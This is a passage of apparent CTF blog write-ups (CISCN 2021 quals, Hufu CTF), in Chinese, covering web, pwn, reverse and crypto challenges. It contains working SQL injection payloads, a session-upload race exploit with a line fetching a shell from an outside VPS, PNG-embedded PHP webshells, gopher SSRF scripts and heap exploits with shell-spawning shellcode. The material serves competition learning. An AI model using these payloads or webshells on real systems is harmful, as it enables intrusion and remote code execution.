r.text if 'login\u003c' in r.text: flag += chr(char-1) print(flag) break   到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：\n1 2 3 4 5 6 7 8  admin')||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))# //Duplicate column name 'e0f1d955-bbba-43c3-b078-a81b3fc4bf28' admin')||(extractvalue(1,concat(0x7e,(select`e0f1d955-bbba-43c3-b078-a81b3fc4bf28`fromsecurity.flag),0x7e)))#//XPATHsyntaxerror:'~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d'admin')||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))# //XPATH syntax error: '~uFWI-}~'   CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}\nmiddle_source 首页给了任意文件包含\n扫目录得到.listing，得到you_can_seeeeeeee_me.php是phpinfo页面\n有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用session.upload_progress进行session文件包含\n前者尝试无效果\n从phpinfo得到了session保存路径：/var/lib/php/sessions/fccecfeaje/\n尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell\n在/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g发现flag\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  import requests import threading #file_content = '\u003c?php print_r(scandir(\"/etc\"));?\u003e' #file_content = '\u003c?php copy(\"http://myvps/s.txt\",\"/tmp/leon.php\");echo \"666666666\";?\u003e' #s.txt是shell一句话 file_content = '\u003c?php var_dump(file_get_contents(\"/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g\"));?\u003e' url='http://124.70.35.238:23579/' r=requests.session() def POST(): while True: file={ \"upload\":('\u003c?php echo 999;?\u003e', file_content, 'image/jpeg') } data={ \"PHP_SESSION_UPLOAD_PROGRESS\":file_content } headers={ \"Cookie\":'PHPSESSID=1234' } r.post(url,files=file,headers=headers,data=data) def READ(): while True: event.wait() t=r.post(\"http://124.70.35.238:23579/\", data={\"cf\":'../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234'}) if len(t.text) \u003c 2230: print('[+]retry') else: print(t.text) event.clear() event=threading.Event() event.set() threading.Thread(target=POST,args=()).start() threading.Thread(target=POST,args=()).start() threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start()   CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}\nupload mb_strtolower、PHP二次渲染\n这道题收卷两小时之前就看到phpinfo了，但是没做出来，有点可惜\n访问题目就有源码\nindex.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  \u003c?php if (!isset($_GET[\"ctf\"])) { highlight_file(__FILE__); die(); } if(isset($_GET[\"ctf\"])) $ctf = $_GET[\"ctf\"]; if($ctf==\"upload\") { if ($_FILES['postedFile']['size'] \u003e 1024*512) { die(\"这么大个的东西你是想d我吗？\"); } $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']); if ($imageinfo === FALSE) { die(\"如果不能好好传图片的话就还是不要来打扰我了\"); } if ($imageinfo[0] !== 1 \u0026\u0026 $imageinfo[1] !== 1) { die(\"东西不能方方正正的话就很讨厌\"); } $fileName=urldecode($_FILES['postedFile']['name']); if(stristr($fileName,\"c\") || stristr($fileName,\"i\") || stristr($fileName,\"h\") || stristr($fileName,\"ph\")) { die(\"有些东西让你传上去的话那可不得了\"); } $imagePath = \"image/\" . mb_strtolower($fileName); if(move_uploaded_file($_FILES[\"postedFile\"][\"tmp_name\"], $imagePath)) { echo \"upload success, image at $imagePath\"; } else { die(\"传都没有传上去\"); } }   扫目录能扫到example.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  \u003c?php if (!isset($_GET[\"ctf\"])) { highlight_file(__FILE__); die(); } if(isset($_GET[\"ctf\"])) $ctf = $_GET[\"ctf\"]; if($ctf==\"poc\") { $zip = new \\ZipArchive(); $name_for_zip = \"example/\" . $_POST[\"file\"]; if(explode(\".\",$name_for_zip)[count(explode(\".\",$name_for_zip))-1]!==\"zip\") { die(\"要不咱们再看看？\"); } if ($zip-\u003eopen($name_for_zip) !== TRUE) { die (\"都不能解压呢\"); } echo \"可以解压，我想想存哪里\"; $pos_for_zip = \"/tmp/example/\" . md5($_SERVER[\"REMOTE_ADDR\"]); $zip-\u003eextractTo($pos_for_zip); $zip-\u003eclose(); unlink($name_for_zip); $files = glob(\"$pos_for_zip/*\"); foreach($files as $file){ if (is_dir($file)) { continue; } $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, ['x' =\u003e 0, 'y' =\u003e 0, 'width' =\u003e $size, 'height' =\u003e $size]); if ($second !== FALSE) { $final_name = pathinfo($file)[\"basename\"]; imagepng($second, 'example/'.$final_name); imagedestroy($second); } imagedestroy($first); unlink($file); } }   bypass image size 上传处对图片的尺寸做出了要求，此时有一种方法来绕过。将下列代码拼接到POST流最后即可绕过 getimagesize 的检测\n#define width 1\r#define height 1\r经过一番调试，可以用一个txt文件和一个php文件打包一个压缩包上传，也可以直接抓包在POST数据流最后手动加上这两行\nbypass zip mb_strtolower可以兼容unicode字符，可以使用unicode字符İ，经过mb_strtolower转换变成小写字母i\nhttps://www.compart.com/en/unicode/U+1D5A8\n1 2  \u003c?php echo mb_strtolower('İ'); //i̇   在example解压的时候自然是../目录穿越解压我们上传的压缩包\n然后就是imagecreatefrompng，这个函数只要你确确实实是一张图片(也就是Windows下改后缀为png，能正常打开)就可以过，之后他使用imagepng函数把这个文件输出到web路径，不过遗憾的是，经过这个两个函数一读一输出，图片内容会变\n也就是说，通过Windows cmd的copy命令生成的图片马，不顶用，得换高级得马儿\n这就是PHP二次渲染绕过。在此之前先插个预备知识，介绍下PNG的构造\nPNG结构 png 支持三种图像类型\n 索引彩色图像(index-color images) 灰度图像(grayscale images) 真彩色图像(true-color images)  png 标识 png 标识作为 png 图片的头部，为固定的 8 字节\n89 50 4E 47 OD 0A 1A 0A\r数据块 png 定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，标准的数据块; 另一种叫做辅助数据块(ancillary chunks)，可选的数据块。\n关键数据块定义了3个标准数据块，每个 png 文件都必须包含它们。3个标准数据块为: IHDR， IDAT， IEND\n这里介绍4个：\n  文件头数据块IHDR(header chunk)\n  调色板数据块PLTE(palette chunk)\n  图像数据块IDAT(image data chunk)\n  图像结束数据IEND(image trailer chunk)\n  每个数据块都由下表所示的的4个域组成。\n   名称 字节数 说明     Length(长度) 4字节 指定数据块中数据域的长度，其长度不超过$(2^{31}-1)$字节   Chunk Type Code(数据块类型码) 4字节 数据块类型码由ASCII字母(A-Z和a-z)组成   Chunk Data(数据块实际内容) 可变长度 存储按照Chunk Type Code指定的数据   CRC(循环冗余检测) 4字节 存储用来检测是否有错误的循环冗余码    其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码\n   文件头数据块IHDR(header chunk)：\n它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。\n  调色板数据块PLTE(palette chunk)：\n它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：\n     颜色 字节 意义     Red 1 byte 0 = 黑色, 255 = 红   Green 1 byte 0 = 黑色, 255 = 绿色   Blue 1 byte 0 = 黑色, 255 = 蓝色    PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。\r对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。\r  图像数据块IDAT(image data chunk)：  它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。\nIDAT存放着图像真正的数据信息\n  图像结束数据IEND(image trailer chunk)：\n它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。\n00 00 00 00 49 45 4E 44 AE 42 60 82\r 由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82\r  写🐎思路 了解了png结构之后，我们大概有两种思路构造webshell\n  向PLTE插入php代码\nhttps://github.com/hxer/imagecreatefrom-/tree/master/png/analysis\n 分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。\n从对 PLTE chunk 验证的分析可知， 当原始图片格式给索引图片时，PLTE 数据块在满足 png 格式规范的情况下，程序还会进行 CRC 校验和长度合法性验证。因此，要将 PHP 代码写入 PLTE 数据块，不仅要修改 data 域的内容为php代码，然后修改 CRC 为正确的 CRC 校验值，当要填充的代码过长时，可以改变 length 域的数值，满足 length 为3的倍数， 且颜色数不超过色深中规定的颜色数。例如: IHDR 数据块中 Bit depth 为 08, 则最大的颜色数为 2^8=256, 那么 PLTE 数据块 data 的长度不超过 3*256=0x300。 这个长度对写入 php 一句话木马或者创建后门文件足够了。\n 通过文章的exp构造的webshell，能过只有imagecreatefrompng和imagepng的。\n但是经过题目imagecrop这种裁剪，会被有规律的吞掉\n解决方案是可以硬调：\n*/$\u003c?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//\r//就问这是人能调出来的么？\u003c?=eval($_GET[0]);\r  向IDAT插入php代码\n原理剖析：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\nexp：https://github.com/huntergregal/PNG-IDAT-Payload-Generator/\n当然也可以使用php版本的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'wh1sper.php');//要修改的图片的路径 /* 木马内容 \u003c?$_GET[0]($_POST[1]);?\u003e */   网上的wp大多都用的第二种方法，用python的exp。然后是把$_GET[0]改成了EVAL，然后需要按照算法计算一下crc\nhttps://blog.csdn.net/miuzzx/article/details/116885083\nhttps://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass\n 使用参考的 Repo 中的代码可以生成一个长度为 25 的任意 PHP payload 的正方形图片，只需要将自带的 payload 经过 Raw Deflate 之后再 Inflate 即可\n   题外话 这个姿势并不是新东西，在upload-labs17和DDCTF都出现过，没做出来还是说明题刷少了\n另外还有其他图片的二次渲染具体可以看看：https://www.sqlsec.com/2020/10/upload.html#toc-heading-17\n挖坑 这次国赛题目顶啊，后面的每道题都蛮不错的，可惜不知道有没有机会了，等以后有缘就冲了他\n","description":"CISCN 2021 线上初赛","tags":["文件包含","无列名注入","ReflectionMethod","php二次渲染","session.upload_progress"],"title":"CISCN 2021 Quals Writeup web","uri":"/posts/ciscn-2021-quals-writeup/"},{"categories":["ctf_writeup"],"content":"MISC 你会日志分析吗 时间注入，手撸日志得到ascii码，转换到ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==，base64解密\nWeb 签到 签到访问任意PHP文件，User-Agentt: zerodiumphpinfo();\nUser-Agentt: zerodiumsystem('cat /flag');\nunsetme 看到是fatfree框架，github下载最新fatfree-3.7.3源码，本地index.php改成题目给的\n传参后看到debug的调用栈，本地动态调试一下\n直接在unset下断点\n跟进到base.php，看到530行左右有eval，因为是拼接执行所以猜测存在命令注入\n虽然对引号等有转义，但是绕一下就ok，调试的时候发现主要是它对[]过滤的有点问题\n1 2 3  ?a=n[]);system($_POST[0]);echo(1 POST: 0=cat /flag   flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}\n“慢慢做”管理系统 第一步MD5哈希注入，密码kydba\n第二步Gopher打admin.php，存在堆叠注入，用强网杯随便注的rename改表名能得到admin_inner的账户密码\n但是登陆名需要猜解，是admin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # python3 # wh1sper from urllib.parse import quote #username = \"1';rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;\" #username = \"1\" username = \"admin\"#admin_inner/5fb4e07de914cfc82afb44vbaf402203d #我草泥马的脑瘫题 password = \"5fb4e07de914cfc82afb44vbaf402203\"#fake_admin/fake_passwor post_data = \"username={}\u0026password={}\".format(quote(username), quote(password)) cl = len(post_data) stream = \"\"\"POST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: {}Cookie: PHPSESSID=fuj95a6eo7sa84923b6eg5bie2; path=/ {}\"\"\".format(cl, post_data).replace(\"\\n\", \"\\r\\n\") # POST参数先编码一次 host = \"gopher://127.0.0.1:80/\" print(host+'_'+quote(stream)) # Gopher数据流再编码一次 #print(stream)   构造Gopher数据，先打admin.php，得到Cookie之后带着Cookie打flag.php就能拿到flag。\nReverse GoEncrypt 输入符合正则格式的flag:flag{11111111-1111-1111-1111-111111111111}, 除了”-“的其他hex编码 ，之后分成2组 xtea,脚本\n抄百度就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e#define uint32_t unsigned int void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x12345678; for (i = 0; i \u003c num_rounds; i++) { v0 += (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); sum += delta; v1 += (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum \u003e\u003e 11) \u0026 3]); } v[0] = v0; v[1] = v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x12345678, sum = delta * num_rounds; for (i = 0; i \u003c num_rounds; i++) { v1 -= (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum \u003e\u003e 11) \u0026 3]); sum -= delta; v0 -= (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); } v[0] = v0; v[1] = v1; } int main() { uint32_t v[2] = { 0xedf5d910,0x542702cb};//还有一组对照的 改一下就行  uint32_t const k[4] = { 0x10203,0x4050607,0x8090a0b,0xc0d0e0f }; unsigned int r = 32;//num_rounds建议取值为32  // v为要加密的数据是两个32位无符号整数  // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  printf(\"加密前原始数据：0x%x 0x%x\\n\", v[0], v[1]); printf(\"加密后的数据：0x%x 0x%x\\n\", v[0], v[1]); decipher(r, v, k); printf(\"解密后的数据：0x%x 0x%x\\n\", v[0], v[1]); return 0; }   Crackme 输入17个字符分成7和10，又输入一个数要满足\n爆破就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  //一个除 一个% #include\u003cmath.h\u003e#include\u003ciostream\u003e#include\u003cstdio.h\u003eusing namespace std; double nmsl(double a, double b) { double tmp = pow(a,b-1.0); double ret = tmp / exp(a); return ret; } int main() { double v20 = 0.0; double v15 = 0.0; for (int i = 0; i \u003c 12379; ++i) { v20 = 0.0; v15 = 0.0; do { v15 = v15 + nmsl(v20, (double)i) * 0.001; v20 = v20 + 0.001; } while (v20 \u003c= 100.0); int total = (int)(v15 + v15 + 3.0); if(total == 0x5a2)//total == 0x13b03 \tprintf(\"i == %d , x== 0x%x\\n\",i,total); } } //99038   前7个和 99038生成的数组xor ,后面10个 rc4,总的来说都是xor ，找到要xor的数就行\n\u003e\u003e \u003e a = \"9903819\"\r\u003e\u003e \u003e x = [0x8, 0x4d, 0x59, 0x06, 0x73, 0x02, 0x40]\r\u003e\u003e \u003e c = \"\"\r\u003e\u003e \u003e for i in range(7) :\r... c += chr(ord(a[i]) ^ x[i])\r...\r\u003e\u003e \u003e c\r'1ti5K3y'\r\u003e\u003e \u003e s = [0xb2, 0xd6, 0x8e, 0x3f, 0xaa, 0x14, 0x53, 0x54, 0xc6, 0x06]\r\u003e\u003e \u003e key = [0xe0, 0x95, 0xba, 0x60, 0xc9, 0x66, 0x2a, 0x24, 0xb2, 0x36]\r\u003e\u003e \u003e d = \"\"\r\u003e\u003e \u003e for i in range(10) :\r... d += chr(s[i] ^ key[i])\r...\r\u003e\u003e \u003e c + d\r'1ti5K3yRC4_crypt0'\r\u003e\u003e \u003e\rPwn apollo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  #coding=utf-8 from pwn import* #context.log_level = 'DEBUG' ''' func_table:\t[0x14018 + proc_base] opcode_table: [0x13FE8 + proc_base] 0x0: 0x4D-\u003e calloc(location,1); calloc(timeS,1); opcode +=3; 0x1: 0x2A-\u003eadd;just one times; p8(index0) + p8(index1)+p16(Size); opcode+=5 0x2: 0x2F-\u003e free(); p8(index0) + p8(index1); opcode+=3 0x3: 0x2B-\u003e Set the Location; p8(index0) + p8(index1) + p8(Location); opcode+=4 1 \u003c Size \u003c= 4; 0x4: 0x2D-\u003e Set the Location into 0; p8(index0) + p8(index1); opcode +=3 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0x5: 0x77-\u003e opcode++; Up -\u003e2、3-\u003e2; or 0-\u003e1; 0x6: 0x73-\u003e opcode++; Down -\u003e2、3-\u003e2; or 0-\u003e1; 0x7: 0x61-\u003e opcode++; Left -\u003e2、3-\u003e2; or 0-\u003e1; 0x8: 0x64-\u003e opcode++; Right-\u003e2、3-\u003e2; or 0-\u003e1; 0x9: 0x70-\u003e show;opcode++; 0xA: 0x00-\u003eExit 0xB: 0x01-\u003edefault;opcode++; ''' #p = process(['qemu-aarch64','-g','5555','-L','.','./main']) libc = ELF('./libc-2.27.so') p = remote('8.140.179.11',13422) payload = '\\x4D\\x10\\x10' #init_All_Var payload += '\\x2A\\x00\\x04\\xF0\\x04' # Add 0 payload += '\\x2A\\x00\\x05\\x10\\x00' # Add 1 payload += '\\x2F\\x00\\x04' #delete 0 payload += '\\x2A\\x00\\x04\\xF0\\x00' # Add 0 payload += '\\x70' payload += '\\x73'*0xE payload += '\\x64\\x61'*0x36 payload += '\\x64'*6 payload += '\\x2B\\x0E\\x07\\x03' payload += '\\x64' payload += '\\x2B\\x0F\\x08\\x03' payload += '\\x73' payload += '\\x2A\\x00\\x06\\x70\\x00' # Add 2 payload += '\\x2A\\x00\\x07\\x70\\x03' # Add 3 payload += '\\x2F\\x00\\x06' # delete 2 payload += '\\x2F\\x00\\x04' # delete 0 payload += '\\x2A\\x00\\x04\\x70\\x01' # Add 0 payload += '\\x2A\\x00\\x06\\x70\\x00' # Add 2 payload += '\\x2A\\x00\\x08\\x70\\x00' # Add free_hook payload += '\\x2F\\x00\\x06' # delete 2 payload += '\\x00' p.sendlineafter('cmd\u003e ',payload) sleep(0.1) p.sendline('FMYY') sleep(0.1) p.sendline('FMYY') sleep(0.1) p.send('\\x10') p.recvuntil('pos:0,4\\n') libc_base = (u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) | 0x4000000000) - 0xF10 - 0x154000 log.info('LIBC:\\t' + hex(libc_base)) log.info('__malloc_Hook:\\t' + hex(libc_base + libc.sym['__malloc_hook'])) system = libc_base + libc.sym['system'] free_hook = libc_base + libc.sym['__free_hook'] log.info('__free_hook:\\t' + hex(free_hook)) p.sendline('FMYY') sleep(0.1) p.sendline('FMYY') sleep(0.1) p.sendline('\\x00'*0x100 + p64(free_hook)) sleep(0.1) p.sendline('/bin/sh\\x00') sleep(0.1) p.sendline(p64(system)) sleep(0.1) p.interactive()   quite 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #coding=utf-8 from pwn import* ''' X22: 0x100000000000 X21: OPCode_Memory N:0 Index:0x28; X22 --;opcode+=1 N:1\tIndex:0x29; X22 ++;opcode+=1 N:2\tIndex:0x2A; [X22]++;opcode+=1; N:3\tIndex:0x2F; [X22]--;opcode+=1; N:4\tIndex:0x40; _IO_putc(X22);opcode+=1; N:5\tIndex:0x23; _IO_getc(X22);opcode+=1; N:6\tIndex:0x5B; N:7\tIndex:0x5D; N:8\tIndex:0x00; N:9\tIndex:0x47; Call 0x100000000000 N:A Index:0x01; Default; ''' #p = process(['qemu-aarch64','-g','6666','-L','.','./main']) p = remote('8.140.179.11',51322) shellcode = '\\xE1\\x45\\x8C\\xD2\\x21\\xCD\\xAD\\xF2\\xE1\\x65\\xCE\\xF2\\x01\\x0D\\xE0\\xF2\\xE1\\x8F\\x1F\\xF8\\xE1\\x03\\x1F\\xAA\\xE2\\x03\\x1F\\xAA\\xE0\\x63\\x21\\x8B\\xA8\\x1B\\x80\\xD2\\xE1\\x66\\x02\\xD4' p.send('\\x23\\x29'*len(shellcode) + '\\x47') sleep(0.5) p.send(shellcode) p.interactive()   Crypto simultaneous 审计代码，发现x和y大小均约为381bit，z约为631bit，e和N为1024bit。 首先发现x很小且三次加密时所用的x相同，而ex-yN=y*(p+q+1)-z_只有约893bit，与e和N相比都很小，所以构造格子进行格基规约： sage: A = matrix(ZZ,4,[2**512,0,0,0,e1,-n1,0,0,e2,0,-n2,0,e3,0,0,-n3]) sage: B = A.transpose() sage: C = B.LLL() sage: C[0] (8866336715717388426172963523471330954077188809904909656840498650956244748060448654334827362938608283011460454932611722549140899975837332516255422319218997339352725870280417222934472617692234368327945625080892989434758573490606357931772643305970422681049000558333001728, 23565804679746565933710388872729524528226359415562140615287656018817455800535466780287799003178367701822507942125498993654311133503025992126025046704035560696109076086415547740763302445007651443569886959741145900119997240641197056821966126478523677707529102803982641184, 108960871214576793022207296445632894090843538519696872165557959140648817747262325676571075528643507778206273055515718254598755429648600953278539486434738401784633970948810856056270409547951407224850758488218814477712938397264786375512963038875176200582202541244988064762, 104724522928227808113699830194721186205703616771719604100697952234782584810976846111816114359575185225135299113577201578471709313075817367107222881505195506424821820424051124267603014862466153889752001180168723756986189763744130308518039129969039000165646079670467289202) sage: x = C[0][0]\u003e\u003e512 sage: x 661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143 sage: isPrime(x) 1 构造如上所述的格子，可以从格基规约的结果中快速得到x。 得到x之后，仍然根据ex-yN=y*(p+q+1)-z_\u003cN，得到y=ex//N，所以三次的y都可以用这个等式求出来。 sage: y3 = e3x//n3 sage: isPrime(y3) 1 sage: y2 = e2x//n2 sage: isPrime(y2) 1 sage: y1 = e1x//n1 sage: isPrime(y1) 1 x、y都知道了，所以余数k=y*(p+q+1)-z_也可以相应地求出 sage: k3 = e3x-y3n3 sage: k2 = e2x-y2n2 sage: k1 = e1x-y1n1 分析余项k的结构： k = y*(p+q+1)-z_ = y*(p+q+1) - zbound - ((p + 1)(q + 1)y - zbound) % x = y(p+q+1) + int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) - ((p + 1)(q + 1)*y - zbound) % x\n在这个式子中，第三项((p + 1)*(q + 1)y - zbound) % x，是对x取得的余数，所以它肯定是一个小于x的非负数；而第二项 int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q)))的值与实数((p-q) * round(n ** 0.25) * y) / (3 * (p + q))的差不超过常数1。所以可以得到k - y(p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q)))的绝对值是不会超过x+y的。而(x+y)//y是很小很小的，所以可以暂时忽略不计。\n所以令K = k//y，则几乎可以认为K=p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q))。 这里round(n ** 0.25)已知，未知量只有p-q和p+q。 对整个等式进行简单的变形后可以得到用含p+q的式子表示p-q： p - q = 3 * (p + q) * (K-1-(p+q)) / round(n ** 0.25) 而根据平方差公式，(p+q)^2 - (p-q)^2 = 4pq = 4n 所以令p+q=s，则上式可化为ss-int(9ss(K-1-s)(K-1-s))/(round(n^0.25))^2 = 4n。 而这个方程可以用二分法求其近似整数解，然后稍微根据奇偶性做点相应的修正。 sage: def magic(K,N): ....: l = 0 ....: r = K ....: for i in range(515): ....: s = (l+r)//2 ....: v = ss-int(ss9*(K-1-s)*(K-1-s))//(round(N^0.25)round(N^0.25)) ....: if(v\u003c4N): ....: l = s ....: else: ....: r = s ....: return r ....: sage: s3 = magic(K3,n3) sage: s2 = magic(K2,n2) sage: s1 = magic(K1,n1) sage: s3 18459018640955512832829048105711364903415072505002892754520813962752576865824290315357137127800833228562342513337961044655924159981814783588968959511015508 sage: s2 19511198066679441661645179970610060853694402093688175864187492448475141832783517018527146512367573855149291232173039125664151037907250865382648639649226905 sage: s2 = s2+1 sage: s1 19094603811148743548404150847713419121365563250591127608146415278074868880338697379102160497997619208075125156916806494003926028149361835606603268896884014\n三个p+q都求出来之后，就可以获取私钥d，正常解密得到flag。\nsage: d1 = inverse(e1,n1+s1+1) sage: d2 = inverse(e2,n2+s2+1) sage: d3 = inverse(e3,n3+s3+1) sage: def decrypt(c, d, n): ....: n = int(n) ....: size = n.bit_length() // 2 ....: ....: c_high, c_low = c ....: b = (c_low2 - c_high3) % n ....: EC = EllipticCurve(Zmod(n), [0, b]) ....: m_high, m_low = (EC((c_high, c_low)) * d).xy() ....: m_high, m_low = int(m_high), int(m_low) ....: ....: return (m_high \u003c\u003c size) | m_low ....: sage: m1 = decrypt(c1,d1,n1) sage: m2 = decrypt(c2,d2,n2) sage: m3 = decrypt(c3,d3,n3) sage: long_to_bytes(m0^^m1^^m2^^m3) b'flag{b4dd980a-cd0b-422a-bbee-e9005e1c6380}'\n","description":"虎符CTF打了个No.8，这波是队友带飞","tags":["代码审计","MD5哈希注入","SSRF"],"title":"虎符CTF Writeup by X1cT34m","uri":"/posts/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/"},{"categories":["ctf_writeup"],"content":"Misc 签到 BP抓包爆破\nCrypto RSA attack 开三次方根就有了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from gmpy2 import iroot from Crypto.Util.number import * p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031 p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034 n=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793 c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413 e = 1+1+1 for k in range(1000): if iroot(c+k*n,3)[1]==True: m=iroot(c+k*n,3)[0] break flag=long_to_bytes(m) print(flag)   Reverse go 调换顺序 ，base58没了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 